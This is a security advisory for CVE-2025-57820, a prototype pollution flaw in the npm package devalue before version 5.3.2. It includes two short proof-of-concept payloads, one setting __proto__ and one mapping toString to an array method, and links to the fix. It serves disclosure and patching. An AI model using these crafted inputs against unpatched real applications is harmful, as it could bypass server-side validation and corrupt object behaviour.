# [H] devalue prototype pollution vulnerability

## Summary
Severity: High
Advisory: GHSA-vj54-72f3-p5jv
CVE: CVE-2025-57820
CWE: CWE-1321
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI:N/VA:N/SC:H/SI:H/SA:H (CVSS_V4)
Published: 2025-08-26
Source: https://github.com/advisories/GHSA-vj54-72f3-p5jv
Type: github-advisory

## Affected
- npm: `devalue` — affected >=0 <5.3.2

## Details
## 1. `devalue.parse` allows `__proto__` to be set

A string passed to `devalue.parse` could represent an object with a `__proto__` property, which would assign a prototype to an object while allowing properties to be overwritten:

```js
class Vector {
  constructor(x, y) {
    this.x = x;
    this.y = y;
  }

  get magnitude() {
    return (this.x ** 2 + this.y ** 2) ** 0.5;
  }
}

const payload = `[{"x":1,"y":2,"magnitude":3,"__proto__":4},3,4,"nope",["Vector",5],[6,7],8,9]`;

const vector = devalue.parse(payload, {
  Vector: ([x, y]) => new Vector(x, y)
});

console.log("Is vector", vector instanceof Vector); // true
console.log(vector.x) // 3
console.log(vector.y) // 4
console.log(vector.magnitude); // "nope" instead of 5
```

## 2. `devalue.parse` allows array prototype methods to be assigned to object

In a payload constructed with `devalue.stringify`, values are represented as array indices, where the array contains the 'hydrated' values:

```js
devalue.stringify({ message: 'hello' }); // [{"message":1},"hello"]
```

`devalue.parse` does not check that an index is numeric, which means that it could assign an array prototype method to a property instead:

```js
const object = devalue.parse('[{"toString":"push"}]');
object.toString(); // 0
```

This could be used by a creative attacker to bypass server-side validation.

## References
- https://github.com/sveltejs/devalue/security/advisories/GHSA-vj54-72f3-p5jv
- https://nvd.nist.gov/vuln/detail/CVE-2025-57820
- https://github.com/sveltejs/devalue/commit/0623a47c9555b639c03ff1baea82951b2d9d1132
- https://github.com/sveltejs/devalue
